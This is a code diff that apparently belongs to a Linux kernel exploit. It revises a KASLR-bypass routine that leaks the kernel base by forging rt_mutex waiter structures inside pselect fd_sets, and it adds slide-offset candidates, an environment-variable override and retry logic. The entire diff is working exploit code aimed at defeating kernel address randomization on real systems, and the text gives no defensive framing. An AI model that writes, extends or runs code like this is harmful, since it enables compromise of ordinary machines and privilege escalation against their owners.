@@ -1,12 +1,20 @@
 #include "common.h"
 
+#ifndef SLIDE_MAX_ATTEMPTS
 #define SLIDE_MAX_ATTEMPTS 20
+#endif
 #define SLIDE_PSELECT_NFDS PSELECT_ROUTE_NFDS
 #define SLIDE_PSELECT_PAD_BYTES 0
 #define SLIDE_PSELECT_WORD_SHIFT 0
 #define SLIDE_WAIT_NSEC 50000000L
 #define SLIDE_REQUEUE_MAX_POLLS 1000
 #define SLIDE_REQUEUE_POLL_USEC 1000
+
+#ifdef SLIDE_P0_OFFSET_CANDIDATES
+static const uintptr_t slide_p0_offsets[] = {
+  SLIDE_P0_OFFSET_CANDIDATES
+};
+#endif
 
 static uint32_t slide_f_wait;
 static uint32_t slide_f_pi_target;
@@ -126,25 +134,25 @@ void prepare_slide_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
     uint64_t value;
     const char *name;
   } words[] = {
-    {0, SLIDE_LOGGERS_0_1, "tree_pc"},
+    {0, SLIDE_LOGGERS_0_1 + slide_p0_offset, "tree_pc"},
     {1, 0, "tree_right"},
-    {2, SLIDE_RANDOM_BOOT_ID_DATA, "tree_left"},
+    {2, SLIDE_WAITER_TREE_LEFT + slide_p0_offset, "tree_left"},
     {3, FAKE_WAITER_PRIO, "tree_prio"},
-    {5, SLIDE_LOGGERS_0_1, "pi0"},
+    {5, SLIDE_LOGGERS_0_1 + slide_p0_offset, "pi0"},
     {6, 0, "pi1"},
-    {7, SLIDE_RANDOM_BOOT_ID_DATA, "pi2"},
+    {7, SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset, "pi2"},
     {8, FAKE_WAITER_PRIO, "pi_prio"},
     {9, 0, "pi_deadline"},
 #if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
     {10, fake_task, "task"},
 #else
-    {10, SLIDE_INIT_TASK, "task"},
+    {10, SLIDE_WAITER_TASK + slide_p0_offset, "task"},
 #endif
     {11, fake_lock, "lock"},
 #if defined(SLIDE_USE_FAKE_TASK) && SLIDE_USE_FAKE_TASK
     {12, 0, "wake_state"},
 #else
-    {12, 3, "wake_state"},
+    {12, SLIDE_WAITER_WAKE_STATE, "wake_state"},
 #endif
     {13, 0, "ww_ctx"},
   };
@@ -485,6 +493,11 @@ static int slide_commit_stext(uint64_t stext, const char *source) {
                (unsigned long long)slide);
     return 0;
   }
+  if (strcmp(source, "pselect") == 0 && slide != slide_p0_offset) {
+    pr_warning("slide stale boot_id candidate=%08zx leaked_slide=%08llx\n",
+               slide_p0_offset, (unsigned long long)slide);
+    return 0;
+  }
   kaslr_base = stext;
   kaslr_slide = slide;
   slide_p0_offset = slide;
@@ -497,12 +510,45 @@ static int slide_commit_stext(uint64_t stext, const char *source) {
 }
 
 int slide_leak_kernel_base(void) {
+  const char *forced_offset_arg = getenv("SLIDE_P0_OFFSET");
+  uintptr_t forced_offset = 0;
+  int forced = forced_offset_arg && *forced_offset_arg;
+  if (forced) {
+    char *end = NULL;
+    errno = 0;
+    unsigned long long value = strtoull(forced_offset_arg, &end, 0);
+    if (errno || end == forced_offset_arg || *end || value > 0x1f0000ULL ||
+        (value & 0xffffULL) != 0) {
+      pr_error("slide invalid forced p0 offset=%s\n", forced_offset_arg);
+      return 0;
+    }
+    forced_offset = (uintptr_t)value;
+    pr_info("slide forced p0 offset=%08zx\n", forced_offset);
+  }
+
   uint64_t existing_stext = slide_read_stext();
   if (existing_stext && slide_commit_stext(existing_stext, "boot_id")) {
     return 1;
   }
 
-  for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
+  int max_attempts = forced ? 1 : SLIDE_MAX_ATTEMPTS;
+  for (int attempt = 1; attempt <= max_attempts; attempt++) {
+    if (forced) {
+      slide_p0_offset = forced_offset;
+    } else {
+#ifdef SLIDE_P0_OFFSET_CANDIDATES
+      slide_p0_offset = slide_p0_offsets[
+          (size_t)(attempt - 1) %
+          (sizeof(slide_p0_offsets) / sizeof(slide_p0_offsets[0]))];
+#else
+      slide_p0_offset = 0;
+#endif
+    }
+    pr_info("slide attempt %d/%d p0_offset=%08zx logger_parent=%016llx "
+            "bootid_target=%016llx\n",
+            attempt, max_attempts, slide_p0_offset,
+            (unsigned long long)(SLIDE_LOGGERS_0_1 + slide_p0_offset),
+            (unsigned long long)(SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset));
     page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
     if (!page_base || !fake_lock) {
       continue;
